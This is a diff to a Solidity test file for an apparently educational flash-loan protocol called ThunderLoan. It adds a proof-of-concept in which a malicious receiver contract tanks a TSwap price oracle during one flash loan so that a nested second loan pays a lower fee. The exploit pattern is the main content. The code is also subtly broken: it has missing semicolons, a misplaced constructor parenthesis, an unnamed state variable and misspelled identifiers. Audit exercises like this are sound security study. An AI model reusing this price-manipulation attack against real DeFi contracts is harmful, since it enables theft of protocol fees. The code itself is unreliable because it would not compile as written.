@@ -138,8 +138,17 @@ contract ThunderLoanTest is BaseTest {
         console2.log("Fee:", normalFeeCost);
 
         uint256 amountToBorrow = 50e18;
+        MaliciousFlashLoanReciver flr = new MaliciousFlashLoanReciver(address(tswapPool)),
+        address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA));
 
+        vm.startPrank(user);
+        tokenA.mint(address(flr), 100e18);
+        thunderLoan.flashloan(address(flr),tokenA, amountToBorrow,"");
+        vm.stopPrank();
 
+        uint256 attackFee = flr.feeOne() + flr.feeTwo()
+        console2.log("Attack fee is: ", attackFee);
+        assert(attackFee < normalFeeCost);
 
     }
 }
@@ -149,8 +158,8 @@ contract MaliciousFlashLoanReciver is IFlashLoanReciver{
     address repayAddress;
     BuffMockTSwap;
     bool attacked;
-    uint256 feeOne;
-    uint256 feeTwo;
+    uint256 public feeOne;
+    uint256 public feeTwo;
 
     constructor(address _tswapPool, address _thunderLoan, address _repayAddresss){
         tswapPool = BuffMockTSwap(_tswapPool);
@@ -159,7 +168,6 @@ contract MaliciousFlashLoanReciver is IFlashLoanReciver{
 
     }
 
-    interface IFlashLoanReceiver {
     function executeOperation(
         address token,
         uint256 amount,
@@ -173,13 +181,25 @@ contract MaliciousFlashLoanReciver is IFlashLoanReciver{
         if(!attacked){
             feeOne = fee;
             attacked = true;
+            // Tanks the price. 
             uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18,100e18);
             IERC20(token).approve(address(tswapPool))
+            // Calling second flash loan. 
             tswapPool.swapPoolToekForWethBasedOnInputPoolToken(50e18, wethBought,block.timestamp)
             thunderLoan.flashloan(address(this),IERC20(token),amount,"");
+            //Repay
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(token,amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
 
         } else {
-
+            feeTwo = fee;
+            //Repay
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token),amount + fee); 
+            IERC20(token).approve(address(thunderLoan), amount + fee);
+            thunderLoan.repay(IERC20(token),amount + fee);
         }
+        return true;
 }
 }
